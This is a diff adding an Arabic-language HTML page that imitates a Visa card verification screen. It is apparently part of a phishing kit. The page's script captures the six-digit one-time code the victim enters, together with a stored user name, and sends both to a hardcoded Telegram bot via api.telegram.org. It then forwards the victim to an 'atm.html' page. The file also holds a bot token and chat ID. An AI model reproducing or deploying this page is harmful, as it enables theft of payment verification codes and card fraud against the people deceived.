@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>صفحة رمز التحقق</title>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Tajawal', sans-serif;
+      background: linear-gradient(135deg, #ffffff, #ffffff);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    .verification-card {
+      background-color: #fff;
+      width: 350px;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(1, 1, 1, 1.1);
+      text-align: center;
+      transition: transform 0.3s;
+      z-index: 1;
+      position: relative;
+      max-height: 80vh;
+      overflow-y: auto;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    .input-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: 700;
+      color: #444;
+    }
+
+    .input-code {
+      font-size: 22px;
+      text-align: center;
+      border: 2px solid #ccc;
+      border-radius: 10px;
+      margin: 5px;
+      outline: none;
+      transition: border 0.3s;
+      direction: ltr;
+    }
+
+    .input-code:focus {
+      border-color: #66ccff;
+    }
+
+    .btn-verify {
+      background-color: #006a8f;
+      color: #fff;
+      border: none;
+      width: 100%;
+      padding: 15px;
+      font-size: 18px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .btn-verify:hover {
+      background-color: #005b7a;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 14px;
+      display: none;
+      margin-top: 15px;
+    }
+
+    header {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      background-color: #fff;
+      padding: 20px 0;
+      text-align: center;
+      font-size: 25px;
+      font-weight: bold;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      z-index: 1000;
+    }
+
+    #img11 {
+      margin-left: 20px;
+      width: 150px;
+      height: auto;
+    }
+
+    @media (max-width: 600px) {
+      body {
+        padding-bottom: 100px;
+      }
+
+      .verification-card {
+        width: 80%;
+        max-height: 70vh;
+        padding: 20px;
+      }
+
+      .input-code {
+        width: 30px;
+        height: 45px;
+        font-size: 20px;
+      }
+
+      .btn-verify {
+        font-size: 16px;
+      }
+    }
+    #code1 { 
+    width: 200px;
+}
+#img22 { 
+  width: 150px;
+  margin-top: 15px;
+  margin-bottom: -200px;
+}
+#bhhhnb { 
+  max-width: 200px;
+}
+  </style>
+</head>
+<body>
+  
+  <header id="hedd">
+    <img src="Visa_Inc._logo.svg.png" alt="Logo" id="img11">
+  </header>
+  
+  <div class="verification-card">
+    <h2>أدخل رمز التحقق</h2>
+    <form id="paymentForm">
+      <div class="input-group">
+        <label for="code1">رمز التحقق</label>
+        <input type="text" id="code1" class="input-code" inputmode="numeric" maxlength="6" />
+      </div>
+      <button type="submit" class="btn-verify">تحقق</button>
+      <div class="error-message" id="errorMessage">الرمز غير صحيح. يرجى المحاولة مرة أخرى.</div>
+    </form>
+  </div>
+
+  <script>
+document.getElementById('paymentForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // منع الإرسال الفوري للنموذج
+
+    const code1 = document.getElementById('code1').value;
+    const name = localStorage.getItem("storedUserName");
+
+    if (!code1 || code1.length !== 6) {
+        document.getElementById('errorMessage').style.display = 'block';
+    } else {
+        document.getElementById('errorMessage').style.display = 'none';
+
+        const token = '7567367004:AAGG3iwWYOvR9NwvLeUQRG49WVNBcdtFTcM'; 
+        const chatId = '7595871538';  
+
+        const message = ` تم إدخال رمز التحقق :\n\n👤 من: ${name}\n🔐 رمز التحقق: ${code1}`;
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                // ✅ التوجيه بعد النجاح
+                window.location.href = 'atm.html'; // ← غيّر هذا إلى رابط الصفحة المطلوبة
+            } else {
+                console.error('فشل الإرسال إلى تلجرام');
+            }
+        })
+        .catch(error => {
+            console.error('خطأ أثناء الإرسال إلى تلجرام:', error);
+        });
+    }
+});
+
+
+  </script>
+
+</body>
+</html>
